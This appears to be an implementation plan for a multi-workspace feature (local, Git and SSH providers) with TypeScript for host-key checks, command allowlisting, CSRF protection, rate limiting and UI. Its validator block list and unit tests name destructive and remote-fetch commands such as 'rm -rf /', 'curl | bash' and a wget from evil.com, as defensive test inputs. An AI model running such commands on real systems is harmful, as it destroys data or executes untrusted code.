# Flexible Workspace - Refined Implementation Plan

**Date:** 2026-02-22
**Issue:** #50
**Branch:** `feature/50-flexible-workspace`
**Status:** Refined after Ralph Loop Review

---

## Overview

This refined plan incorporates all critical and high-priority findings from the 8-perspective Ralph Loop review. It transforms the original design into a production-ready implementation plan.

---

## Critical Fixes Incorporated

### 1. SSH Host Key Verification (Security)

```typescript
interface SSHProviderConfig {
  hostKeyVerification: 'strict' | 'tofu' | 'ask';
  knownHostsPath?: string;
}

// Implementation
class SSHProvider {
  private async verifyHostKey(key: string): Promise<boolean> {
    const fingerprint = this.computeFingerprint(key);

    switch (this.config.hostKeyVerification) {
      case 'strict':
        return this.isKnownHost(fingerprint);

      case 'tofu':
        if (this.isKnownHost(fingerprint)) return true;
        await this.addToKnownHosts(fingerprint);
        return true;

      case 'ask':
        if (this.isKnownHost(fingerprint)) return true;
        const accepted = await this.promptUser(fingerprint);
        if (accepted) await this.addToKnownHosts(fingerprint);
        return accepted;
    }
  }
}
```

### 2. Command Allowlist (Security)

```typescript
const ALLOWED_COMMANDS = new Set([
  // File operations
  'ls', 'cat', 'head', 'tail', 'grep', 'find', 'wc',
  // Git
  'git',
  // Build tools
  'npm', 'yarn', 'pnpm', 'node', 'python', 'pip',
  // Testing
  'jest', 'pytest', 'cargo', 'go',
]);

const BLOCKED_PATTERNS = [
  /rm\s+-rf\s+[\/~]/,
  />\s*\/dev\/sd/,
  /mkfs/,
  /dd\s+.*of=\/dev/,
];

class CommandValidator {
  validate(command: string): ValidationResult {
    const baseCommand = command.split(/\s+/)[0];

    if (!ALLOWED_COMMANDS.has(baseCommand)) {
      return {
        allowed: false,
        reason: `Command '${baseCommand}' not in allowlist`,
        canRequest: true,  // User can request approval
      };
    }

    for (const pattern of BLOCKED_PATTERNS) {
      if (pattern.test(command)) {
        return {
          allowed: false,
          reason: 'Command matches blocked pattern',
          canRequest: false,  // Always blocked
        };
      }
    }

    return { allowed: true };
  }
}
```

### 3. Git URL Validation (Security)

```typescript
const GIT_URL_PATTERNS = [
  /^https:\/\/[\w.-]+\/[\w.-]+\/[\w.-]+(\.git)?$/,
  /^git@[\w.-]+:[\w.-\/]+(\.git)?$/,
  /^ssh:\/\/[\w.-]+\/[\w.-\/]+(\.git)?$/,
];

function validateGitUrl(url: string): boolean {
  // Basic pattern check
  if (!GIT_URL_PATTERNS.some(p => p.test(url))) {
    return false;
  }

  // Check for shell metacharacters
  const dangerous = /[;&|`$(){}[\]<>!\\]/;
  if (dangerous.test(url)) {
    return false;
  }

  return true;
}
```

### 4. Atomic Writes (Robustness)

```typescript
class SSHProvider {
  async writeFile(path: string, content: Buffer): Promise<void> {
    const tempPath = `${path}.tmp.${Date.now()}.${randomId()}`;

    try {
      // Write to temp file
      await this.sftp.writeFile(tempPath, content);

      // Atomic rename
      await this.sftp.rename(tempPath, path);
    } catch (error) {
      // Cleanup temp file on failure
      try {
        await this.sftp.unlink(tempPath);
      } catch {}
      throw error;
    }
  }
}
```

### 5. File Locking (Robustness)

```typescript
class FileLockManager {
  private locks: Map<string, Lock> = new Map();

  async acquire(path: string, timeout = 5000): Promise<LockHandle> {
    const key = this.normalizeKey(path);
    const start = Date.now();

    while (this.locks.has(key)) {
      if (Date.now() - start > timeout) {
        throw new LockTimeoutError(`Could not acquire lock for ${path}`);
      }
      await sleep(100);
    }

    const lock: Lock = {
      path,
      acquiredAt: Date.now(),
      owner: this.getOwnerId(),
    };

    this.locks.set(key, lock);

    return {
      release: () => this.locks.delete(key),
      path,
    };
  }
}
```

### 6. Workspace Limits (Scalability)

```typescript
const LIMITS = {
  maxWorkspaces: 20,
  maxConnectionsPerHost: 5,
  maxTotalConnections: 50,
  maxCloneStorageGB: 10,
  connectionIdleTimeoutMs: 30 * 60 * 1000,  // 30 minutes
};

class WorkspaceManager {
  async addWorkspace(config: ProviderConfig): Promise<string> {
    // Check workspace limit
    if (this.workspaces.size >= LIMITS.maxWorkspaces) {
      throw new LimitError(
        `Maximum ${LIMITS.maxWorkspaces} workspaces allowed. ` +
        `Remove unused workspaces to add more.`
      );
    }

    // Check connection limit
    const activeConnections = this.countActiveConnections();
    if (activeConnections >= LIMITS.maxTotalConnections) {
      // LRU eviction
      await this.evictLeastRecentlyUsed();
    }

    // Proceed with workspace creation
    return this.createWorkspace(config);
  }
}
```

---

## Iteration 2 Critical Additions

### 7. Migration Strategy (Operations)

```typescript
// Auto-migrate existing /workspace users on first load
async function migrateExistingWorkspace(): Promise<void> {
  const hasLegacyWorkspace = await fs.exists('/workspace');
  const hasNewWorkspaces = useWorkspaceStore.getState().workspaces.size > 0;

  if (hasLegacyWorkspace && !hasNewWorkspaces) {
    // Auto-create local workspace for /workspace
    await addWorkspace({
      type: 'local',
      path: '/workspace',
      name: 'Current Workspace (Migrated)',
      autoMigrated: true,
    });

    // Preserve existing session associations
    const existingSessions = await discoverSessions('/workspace');
    for (const session of existingSessions) {
      await associateSessionWithWorkspace(session.id, workspaceId);
    }

    // Show migration notice
    toast.info(
      'Your workspace has been migrated to the new multi-workspace system. ' +
      'You can now add additional workspaces using the + button.'
    );
  }
}

// Run on app startup
useEffect(() => {
  migrateExistingWorkspace();
}, []);
```

### 8. CSRF Protection (Security)

```typescript
// middleware.ts - Generate CSRF token
export function middleware(request: NextRequest) {
  const response = NextResponse.next();

  if (!request.cookies.has('csrf-secret')) {
    const secret = crypto.randomUUID();
    response.cookies.set('csrf-secret', secret, {
      httpOnly: true,
      secure: process.env.NODE_ENV === 'production',
      sameSite: 'strict',
    });
  }

  return response;
}

// API route protection
function validateCSRF(req: NextRequest): boolean {
  const token = req.headers.get('X-CSRF-Token');
  const secret = req.cookies.get('csrf-secret')?.value;

  if (!token || !secret) return false;

  // Token = HMAC(secret, timestamp)
  const [timestamp, signature] = token.split('.');
  const expected = crypto
    .createHmac('sha256', secret)
    .update(timestamp)
    .digest('hex');

  return signature === expected && Date.now() - parseInt(timestamp) < 3600000;
}

// Protect all mutating workspace routes
export async function POST(req: NextRequest) {
  if (!validateCSRF(req)) {
    return NextResponse.json({ error: 'Invalid CSRF token' }, { status: 403 });
  }
  // ... handle request
}

// Frontend: Include token in requests
const csrfToken = generateCSRFToken(getCookie('csrf-secret'));
fetch('/api/workspace/connect', {
  method: 'POST',
  headers: { 'X-CSRF-Token': csrfToken },
  body: JSON.stringify(config),
});
```

### 9. API Rate Limiting (Security)

```typescript
// Simple in-memory rate limiter (use Redis in production)
class RateLimiter {
  private requests: Map<string, number[]> = new Map();

  check(key: string, limit: number, windowMs: number): boolean {
    const now = Date.now();
    const requests = this.requests.get(key) || [];

    // Remove old requests
    const recent = requests.filter(t => now - t < windowMs);

    if (recent.length >= limit) {
      return false;
    }

    recent.push(now);
    this.requests.set(key, recent);
    return true;
  }
}

const rateLimiter = new RateLimiter();

export async function POST(req: NextRequest) {
  const ip = req.ip || req.headers.get('x-forwarded-for') || 'unknown';

  // 10 requests per 10 seconds per IP
  if (!rateLimiter.check(ip, 10, 10000)) {
    return NextResponse.json(
      { error: 'Too many requests. Please try again later.' },
      { status: 429 }
    );
  }

  // ... handle request
}
```

### 10. Accessibility (UX)

```tsx
// Accessible workspace tab
function WorkspaceTab({ workspace, isActive, status }: WorkspaceTabProps) {
  return (
    <button
      role="tab"
      aria-selected={isActive}
      aria-label={`${workspace.name}, ${status}`}
      tabIndex={isActive ? 0 : -1}
      className={cn(
        "workspace-tab",
        isActive && "workspace-tab--active"
      )}
    >
      {/* Visual status indicator with accessible alternative */}
      <span aria-hidden="true">
        <StatusIcon status={status} />
      </span>
      <span className="sr-only">{status}</span>

      <span className="workspace-tab__name">{workspace.name}</span>
    </button>
  );
}

// Keyboard navigation for tab bar
function WorkspaceTabBar() {
  const handleKeyDown = (e: KeyboardEvent) => {
    const tabs = document.querySelectorAll('[role="tab"]');
    const currentIndex = Array.from(tabs).findIndex(
      t => t === document.activeElement
    );

    switch (e.key) {
      case 'ArrowLeft':
        const prevIndex = currentIndex > 0 ? currentIndex - 1 : tabs.length - 1;
        (tabs[prevIndex] as HTMLElement).focus();
        break;
      case 'ArrowRight':
        const nextIndex = currentIndex < tabs.length - 1 ? currentIndex + 1 : 0;
        (tabs[nextIndex] as HTMLElement).focus();
        break;
      case 'Home':
        (tabs[0] as HTMLElement).focus();
        break;
      case 'End':
        (tabs[tabs.length - 1] as HTMLElement).focus();
        break;
    }
  };

  return (
    <div role="tablist" aria-label="Workspaces" onKeyDown={handleKeyDown}>
      {/* tabs */}
    </div>
  );
}
```

---

## High Priority Additions

### 11. Onboarding Empty State (UX)

```tsx
function WorkspaceEmptyState() {
  return (
    <div className="flex flex-col items-center justify-center h-full p-8">
      <h2 className="text-xl font-semibold mb-4">
        Welcome to Claude Code Browser
      </h2>
      <p className="text-gray-500 mb-6">
        Add a workspace to get started
      </p>

      <div className="grid grid-cols-3 gap-4">
        <WorkspaceTypeCard
          icon={<Folder />}
          title="Local Directory"
          description="Open a folder on this machine"
          onClick={() => openDialog('local')}
        />
        <WorkspaceTypeCard
          icon={<GitBranch />}
          title="Git Repository"
          description="Clone and work on a repo"
          onClick={() => openDialog('git')}
        />
        <WorkspaceTypeCard
          icon={<Server />}
          title="Remote Server"
          description="Connect via SSH"
          onClick={() => openDialog('ssh')}
        />
      </div>

      <div className="mt-8 text-sm text-gray-400">
        Or drag a folder here to open it
      </div>
    </div>
  );
}
```

### 12. Recent Workspaces (UX)

```typescript
interface WorkspaceHistory {
  recent: Array<{
    config: ProviderConfig;
    lastUsed: number;
    name: string;
  }>;
  favorites: string[];  // Workspace IDs
}

class WorkspaceHistoryManager {
  private readonly MAX_RECENT = 10;

  async recordUsage(workspace: Workspace): Promise<void> {
    const history = await this.load();

    // Remove if exists
    history.recent = history.recent.filter(
      r => r.config.id !== workspace.id
    );

    // Add to front
    history.recent.unshift({
      config: workspace.config,
      lastUsed: Date.now(),
      name: workspace.name,
    });

    // Trim to max
    history.recent = history.recent.slice(0, this.MAX_RECENT);

    await this.save(history);
  }
}
```

### 13. Keyboard Navigation (UX)

```typescript
const WORKSPACE_SHORTCUTS = {
  'mod+p': 'openWorkspaceSwitcher',
  'mod+1': 'switchToWorkspace:0',
  'mod+2': 'switchToWorkspace:1',
  // ... up to mod+9
  'mod+shift+n': 'newWorkspace',
  'mod+shift+w': 'closeWorkspace',
};

function useWorkspaceShortcuts() {
  useHotkeys('mod+p', (e) => {
    e.preventDefault();
    openWorkspaceSwitcher();
  });

  for (let i = 1; i <= 9; i++) {
    useHotkeys(`mod+${i}`, (e) => {
      e.preventDefault();
      switchToWorkspace(i - 1);
    });
  }
}
```

### 14. SSH Connection Pooling (Scalability)

```typescript
class SSHConnectionPool {
  private pools: Map<string, PooledConnection[]> = new Map();

  private getPoolKey(config: SSHConfig): string {
    return `${config.host}:${config.port}:${config.username}`;
  }

  async acquire(config: SSHConfig): Promise<PooledConnection> {
    const key = this.getPoolKey(config);
    const pool = this.pools.get(key) || [];

    // Find available connection
    const available = pool.find(c => !c.inUse && c.isAlive());
    if (available) {
      available.inUse = true;
      available.lastUsed = Date.now();
      return available;
    }

    // Check limit
    if (pool.length >= LIMITS.maxConnectionsPerHost) {
      // Wait for one to become available
      return this.waitForConnection(key);
    }

    // Create new connection
    const conn = await this.createConnection(config);
    pool.push(conn);
    this.pools.set(key, pool);
    return conn;
  }

  release(conn: PooledConnection): void {
    conn.inUse = false;
    conn.lastUsed = Date.now();
  }

  // Cleanup idle connections periodically
  async cleanup(): Promise<void> {
    const now = Date.now();

    for (const [key, pool] of this.pools) {
      const active = pool.filter(c => {
        if (c.inUse) return true;
        if (now - c.lastUsed > LIMITS.connectionIdleTimeoutMs) {
          c.destroy();
          return false;
        }
        return true;
      });

      if (active.length === 0) {
        this.pools.delete(key);
      } else {
        this.pools.set(key, active);
      }
    }
  }
}
```

### 15. Credential Key with Port (Security)

```typescript
type CredentialKey =
  | `ssh:${string}:${number}:${string}:password`
  | `ssh:${string}:${number}:${string}:passphrase`
  | `git:${string}:token`;

function buildSSHCredentialKey(
  host: string,
  port: number,
  username: string,
  type: 'password' | 'passphrase'
): CredentialKey {
  return `ssh:${host}:${port}:${username}:${type}`;
}
```

### 16. Actionable Error Messages (UX)

```typescript
const ERROR_GUIDANCE: Record<string, ErrorGuidance> = {
  ECONNREFUSED: {
    title: 'Connection Refused',
    message: 'The server refused the connection',
    suggestions: [
      'Verify the server is running',
      'Check if SSH is enabled on the server',
      'Confirm the port number (default: 22)',
      'Check firewall settings',
    ],
    commands: [
      { label: 'Test connection', command: 'nc -zv {host} {port}' },
    ],
  },
  ENOTFOUND: {
    title: 'Server Not Found',
    message: 'Could not resolve the hostname',
    suggestions: [
      'Check the hostname spelling',
      'Try using the IP address instead',
      'Verify your DNS settings',
    ],
    commands: [
      { label: 'DNS lookup', command: 'nslookup {host}' },
    ],
  },
  EAUTH: {
    title: 'Authentication Failed',
    message: 'Could not authenticate with the server',
    suggestions: [
      'Verify your username',
      'Check your SSH key is correct',
      'Ensure the key is added to the server',
      'Try password authentication',
    ],
    commands: [
      { label: 'Test SSH key', command: 'ssh -i {keyPath} {user}@{host}' },
    ],
  },
};

function getErrorGuidance(error: WorkspaceError): ErrorGuidance {
  return ERROR_GUIDANCE[error.code] || {
    title: 'Error',
    message: error.message,
    suggestions: ['Try again', 'Check your connection settings'],
  };
}
```

---

## Refined Architecture

### Provider Hierarchy with Extensions

```typescript
// Base provider with shared functionality
abstract class BaseProvider implements WorkspaceProvider {
  protected fileLocks = new FileLockManager();
  protected log: Logger;

  protected async withLock<T>(
    path: string,
    operation: () => Promise<T>
  ): Promise<T> {
    const lock = await this.fileLocks.acquire(path);
    try {
      return await operation();
    } finally {
      lock.release();
    }
  }

  protected async withRetry<T>(
    operation: () => Promise<T>,
    maxRetries = 3
  ): Promise<T> {
    let lastError: Error;

    for (let i = 0; i < maxRetries; i++) {
      try {
        return await operation();
      } catch (error) {
        lastError = error as Error;
        await sleep(Math.min(1000 * Math.pow(2, i), 10000));
      }
    }

    throw lastError!;
  }
}

// Provider-specific extensions
interface GitProviderExtension {
  clone(progress?: ProgressCallback): Promise<void>;
  pull(): Promise<void>;
  push(): Promise<void>;
  checkout(branch: string): Promise<void>;
  getBranches(): Promise<string[]>;
}

interface SSHProviderExtension {
  execStream(command: string): AsyncIterable<ExecOutput>;
  forwardPort(local: number, remote: number): Promise<PortForward>;
  uploadFile(local: string, remote: string, progress?: ProgressCallback): Promise<void>;
  downloadFile(remote: string, local: string, progress?: ProgressCallback): Promise<void>;
}
```

### Event System

```typescript
type WorkspaceEvents = {
  'workspace:added': { workspace: Workspace };
  'workspace:removed': { workspaceId: string };
  'workspace:activated': { workspace: Workspace };

  'provider:connected': { providerId: string };
  'provider:disconnected': { providerId: string; error?: Error };
  'provider:reconnecting': { providerId: string; attempt: number };

  'auth:required': { providerId: string; authType: AuthType };
  'auth:success': { providerId: string };
  'auth:failed': { providerId: string; error: Error };

  'file:changed': { providerId: string; path: string; type: ChangeType };
  'file:conflict': { providerId: string; path: string };

  'error': { error: WorkspaceError; context: string };
};

class WorkspaceEventBus {
  private handlers: Map<keyof WorkspaceEvents, Set<Function>> = new Map();

  on<E extends keyof WorkspaceEvents>(
    event: E,
    handler: (data: WorkspaceEvents[E]) => void
  ): () => void {
    if (!this.handlers.has(event)) {
      this.handlers.set(event, new Set());
    }
    this.handlers.get(event)!.add(handler);

    return () => this.handlers.get(event)?.delete(handler);
  }

  emit<E extends keyof WorkspaceEvents>(
    event: E,
    data: WorkspaceEvents[E]
  ): void {
    this.handlers.get(event)?.forEach(handler => {
      try {
        handler(data);
      } catch (error) {
        console.error(`Error in event handler for ${event}:`, error);
      }
    });
  }
}

// React hook
function useWorkspaceEvent<E extends keyof WorkspaceEvents>(
  event: E,
  handler: (data: WorkspaceEvents[E]) => void
): void {
  useEffect(() => {
    return workspaceEventBus.on(event, handler);
  }, [event, handler]);
}
```

---

## Revised Implementation Phases

### Phase 1: Foundation (Week 1-2)

**Goal:** Core abstraction with local provider + security foundation

| Task | Priority | Effort |
|------|----------|--------|
| WorkspaceProvider interface | Critical | 2h |
| BaseProvider abstract class | Critical | 4h |
| LocalProvider implementation | Critical | 4h |
| FileLockManager | Critical | 3h |
| WorkspaceManager basic lifecycle | Critical | 4h |
| Workspace Zustand store | Critical | 4h |
| Migrate `/workspace` references (19 files) | Critical | 8h |
| CommandValidator (allowlist) | Critical | 4h |
| PathValidator (TOCTOU-safe) | Critical | 3h |

**Deliverable:** Local workspaces work, security foundations in place

### Phase 2: Git Provider (Week 3)

**Goal:** Full git clone workflow with progress

| Task | Priority | Effort |
|------|----------|--------|
| GitProvider implementation | Critical | 6h |
| Git URL validation | Critical | 2h |
| Clone with progress streaming | High | 4h |
| Branch management | High | 3h |
| LocalProvider delegation | High | 2h |
| Clone storage management (LRU) | High | 4h |

**Deliverable:** Git repos can be cloned and worked on

### Phase 3: SSH Provider (Week 4-5)

**Goal:** Secure SSH with connection pooling

| Task | Priority | Effort |
|------|----------|--------|
| SSHProvider implementation | Critical | 8h |
| SSH host key verification | Critical | 4h |
| SSHConnectionPool | Critical | 6h |
| SFTP file operations | High | 4h |
| Atomic writes (temp file rename) | Critical | 2h |
| Remote command execution | High | 4h |
| Connection keep-alive | High | 2h |
| Auto-reconnect with backoff | High | 3h |

**Deliverable:** SSH workspaces fully functional and secure

### Phase 4: Credentials & Security Polish (Week 6)

**Goal:** Secure credential management

| Task | Priority | Effort |
|------|----------|--------|
| CredentialManager | Critical | 4h |
| KeychainStore (keytar) | High | 4h |
| EncryptedFileStore fallback | High | 6h |
| Credential key format (with port) | Critical | 1h |
| Rate limiting per host | High | 2h |
| Security audit | Critical | 8h |

**Deliverable:** Credentials securely stored, security review passed

### Phase 5: UI Components (Week 7-8)

**Goal:** Full workspace management UI

| Task | Priority | Effort |
|------|----------|--------|
| WorkspaceTabBar | Critical | 4h |
| AddWorkspaceDialog | Critical | 6h |
| WorkspaceEmptyState (onboarding) | High | 3h |
| SSHWorkspaceForm (quick/advanced) | High | 4h |
| GitWorkspaceForm | High | 3h |
| LocalWorkspaceForm | Medium | 2h |
| CredentialPrompt modal | High | 3h |
| ConnectionErrorBanner | High | 2h |
| DegradedModeIndicator | Medium | 2h |
| WorkspaceSettingsPanel | Medium | 4h |
| RecentWorkspaces component | High | 3h |

**Deliverable:** Complete workspace management UI

### Phase 6: Polish & UX (Week 9)

**Goal:** Keyboard shortcuts, error guidance, history

| Task | Priority | Effort |
|------|----------|--------|
| Keyboard shortcuts (Cmd+P, Cmd+1-9) | High | 4h |
| WorkspaceSwitcher quick picker | High | 4h |
| Actionable error messages | High | 4h |
| Drag-drop folder to add | Medium | 3h |
| WorkspaceHistory persistence | High | 3h |
| Favorites management | Medium | 2h |

**Deliverable:** Polished, keyboard-friendly UX

### Phase 7: Testing & Documentation (Week 10)

**Goal:** Production-ready with comprehensive tests

| Task | Priority | Effort |
|------|----------|--------|
| Unit tests for providers | Critical | 8h |
| Integration tests (testcontainers) | Critical | 8h |
| E2E tests for key flows | High | 6h |
| Security documentation | Critical | 4h |
| User documentation | High | 4h |
| API documentation | Medium | 3h |

**Deliverable:** Tested, documented, production-ready

---

## Testing Strategy

### Unit Tests

```typescript
describe('LocalProvider', () => {
  it('validates paths against traversal', async () => {
    const provider = new LocalProvider({ path: '/workspace' });
    await expect(provider.readFile('../etc/passwd'))
      .rejects.toThrow(SecurityError);
  });

  it('acquires lock before write', async () => {
    const provider = new LocalProvider({ path: '/workspace' });
    const lockSpy = jest.spyOn(provider['fileLocks'], 'acquire');

    await provider.writeFile('test.txt', Buffer.from('content'));

    expect(lockSpy).toHaveBeenCalledWith('test.txt');
  });
});

describe('CommandValidator', () => {
  it('allows whitelisted commands', () => {
    expect(validator.validate('npm install')).toEqual({ allowed: true });
    expect(validator.validate('git status')).toEqual({ allowed: true });
  });

  it('blocks dangerous patterns', () => {
    expect(validator.validate('rm -rf /')).toMatchObject({ allowed: false });
    expect(validator.validate('curl | bash')).toMatchObject({ allowed: false });
  });

  it('blocks unlisted commands', () => {
    expect(validator.validate('wget http://evil.com/script.sh'))
      .toMatchObject({ allowed: false, canRequest: true });
  });
});
```

### Integration Tests

```typescript
describe('SSHProvider', () => {
  let sshServer: StartedTestContainer;
  let provider: SSHProvider;

  beforeAll(async () => {
    sshServer = await new GenericContainer('linuxserver/openssh-server')
      .withExposedPorts(22)
      .withEnvironment({
        USER_NAME: 'test',
        USER_PASSWORD: 'test',
      })
      .start();

    provider = new SSHProvider({
      host: sshServer.getHost(),
      port: sshServer.getMappedPort(22),
      username: 'test',
      authMethod: 'password',
    });
  });

  it('connects and lists directory', async () => {
    await provider.connect();
    const files = await provider.listDirectory('/home/test');
    expect(files).toBeInstanceOf(Array);
  });

  it('writes files atomically', async () => {
    await provider.connect();
    await provider.writeFile('/home/test/test.txt', Buffer.from('hello'));

    // Verify no temp files left
    const files = await provider.listDirectory('/home/test');
    expect(files.every(f => !f.name.includes('.tmp.'))).toBe(true);
  });
});
```

---

## Dependencies (Final)

```json
{
  "dependencies": {
    "ssh2": "^1.15.0",
    "keytar": "^7.9.0",
    "simple-git": "^3.22.0",
    "eventemitter3": "^5.0.1"
  },
  "devDependencies": {
    "testcontainers": "^10.6.0",
    "@types/ssh2": "^1.11.0"
  }
}
```

---

## Success Criteria

| Criteria | Measurement |
|----------|-------------|
| Security | Zero critical vulnerabilities in security audit |
| Performance | < 100ms workspace switch, < 500ms file list |
| Reliability | 99.9% uptime for local, graceful degradation for remote |
| UX | < 30s to add first workspace for new user |
| Test Coverage | > 80% for providers, 100% for security code |

---

## Open Questions Resolved

| Question | Resolution |
|----------|------------|
| SSH keep-alive interval | 30s default, configurable 10-120s |
| Git clone storage configurable | Yes, via `CLAUDE_WORKSPACES_DIR` |
| Credential prompt UX | Modal for blocking auth |
| Connection pooling | Per-host, max 5 connections |
| Tab limit | 20 workspaces, LRU for connections |
| Host key verification | TOFU default, strict optional |
| Command security | Allowlist + pattern blocks |

---

## Feature Flags for Gradual Rollout

```typescript
const FEATURE_FLAGS = {
  // Provider enablement
  'workspace.providers.local': true,      // Always on after Phase 1
  'workspace.providers.git': false,       // Enable after Phase 2 testing
  'workspace.providers.ssh': false,       // Enable after Phase 3 security audit

  // Security features (always on)
  'workspace.security.csrf': true,
  'workspace.security.rateLimit': true,
  'workspace.security.hostKeyVerify': true,
  'workspace.security.commandAllowlist': true,

  // UX features
  'workspace.ui.multiTab': false,         // Start with single workspace
  'workspace.ui.onboarding': true,
  'workspace.ui.keyboardShortcuts': true,
  'workspace.ui.recentWorkspaces': true,

  // Operations
  'workspace.ops.migration': false,       // Enable after migration testing
  'workspace.ops.telemetry': true,
};

// Usage in code
if (isFeatureEnabled('workspace.providers.ssh')) {
  registerProvider(SSHProvider);
}
```

---

## Rollback Procedures

### Phase 1-2: LocalProvider/GitProvider Issues
```bash
# Revert to previous version
git revert HEAD~N  # N = commits since phase start

# Or disable via feature flag (immediate, no deploy)
curl -X POST $CONFIG_SERVICE/flags/workspace.providers.git -d '{"enabled": false}'
```

### Phase 3: SSH Provider Critical Bug
```bash
# Immediate: Disable SSH via flag
curl -X POST $CONFIG_SERVICE/flags/workspace.providers.ssh -d '{"enabled": false}'

# Cleanup orphaned connections
npm run workspace:cleanup-ssh-connections
```

### Phase 4: Credential Store Corruption
```bash
# Restore from backup
cp ~/.claude/credentials.enc.backup ~/.claude/credentials.enc

# Or reset credentials (user must re-enter)
rm ~/.claude/credentials.enc
# System will prompt for new master password
```

### Migration Rollback
```bash
# Restore pre-migration state
cp ~/.claude/store-backup.json ~/.claude/store.json

# Clear migrated workspace
curl -X DELETE $API/workspace/$MIGRATED_WORKSPACE_ID
```

---

## Review Checklist

Before implementation:
- [ ] Security team reviews auth flows
- [ ] UX review of onboarding flow
- [ ] Performance baseline established
- [ ] Test infrastructure set up

During implementation:
- [ ] Security tests written first (TDD)
- [ ] Integration tests with testcontainers
- [ ] Error messages reviewed with UX

Before release:
- [ ] Penetration testing
- [ ] Documentation complete
- [ ] Performance benchmarks met
- [ ] User acceptance testing
